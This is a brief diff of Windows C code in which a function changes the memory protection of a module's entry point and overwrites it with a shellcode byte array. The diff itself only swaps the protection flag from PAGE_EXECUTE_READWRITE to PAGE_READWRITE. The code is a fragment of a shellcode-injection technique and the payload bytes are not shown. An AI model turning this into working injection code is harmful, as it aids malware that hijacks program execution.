@@ -23,7 +23,7 @@ void hello_func()
     DWORD entryPoint = (DWORD)baseAddress + ntHeader->OptionalHeader.AddressOfEntryPoint;
     DWORD old;
     int size = sizeof(shellcode);
-    VirtualProtect(entryPoint, size, PAGE_EXECUTE_READWRITE, &old);
+    VirtualProtect(entryPoint, size, PAGE_READWRITE, &old);
     for (int i = 0; i < size; i++)
     {
         *((PBYTE)entryPoint + i) = shellcode[i];
